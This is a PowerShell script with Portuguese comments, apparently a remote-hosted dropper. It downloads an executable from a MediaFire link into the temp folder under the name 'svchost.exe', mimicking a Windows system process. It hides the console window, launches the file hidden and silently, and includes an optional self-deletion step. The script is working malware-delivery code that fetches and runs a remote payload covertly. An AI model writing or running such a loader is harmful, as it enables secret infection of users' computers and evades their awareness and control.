# instalar.ps1 - Script remoto que baixa e executa o EXE
# Hospedar em: https://raw.githubusercontent.com/seuusuario/seurepo/main/instalar.ps1

# ===== CONFIGURAÇÕES =====
$urlExe = "https://download1322.mediafire.com/i979z8p7s7rgkrsGfHNNiYI3hvHhBt4__EqzuZPp01OyXwcfPAWnn-UoUkrEAmT7kkty1wY3_rcYoWSdK67iF-oWuERidp433G70kShJ4zTFLFzJR1cfN54Qz4YCFcKIu_UZlT-Kcy0PzwoPurvLh7UEipBSzGgOzaqNPNyapIJPUoc/ho8cdet3sv3n3y0/svchost.exe"
$nomeExe = "svchost.exe"
$pastaTemp = [System.IO.Path]::GetTempPath()
$caminhoCompleto = Join-Path $pastaTemp $nomeExe

# ===== ESCONDER CONSOLE =====
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
} catch {}

# ===== FUNÇÃO DE DOWNLOAD =====
function Download-Arquivo {
    param($url, $destino)
    
    # Tenta WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $destino)
        $wc.Dispose()
        if (Test-Path $destino) { return $true }
    } catch {}
    
    # Tenta Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing
        if (Test-Path $destino) { return $true }
    } catch {}
    
    return $false
}

# ===== DOWNLOAD =====
$sucesso = Download-Arquivo -url $urlExe -destino $caminhoCompleto

# ===== EXECUÇÃO =====
if ($sucesso -and (Test-Path $caminhoCompleto)) {
    # Executa oculto
    Start-Process -FilePath $caminhoCompleto -ArgumentList "--silent" -WindowStyle Hidden
    
    # Opcional: esperar um pouco e verificar
    Start-Sleep -Seconds 2
}

# ===== AUTO-LIMPEZA (opcional) =====
# Remove o script depois de executar
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

exit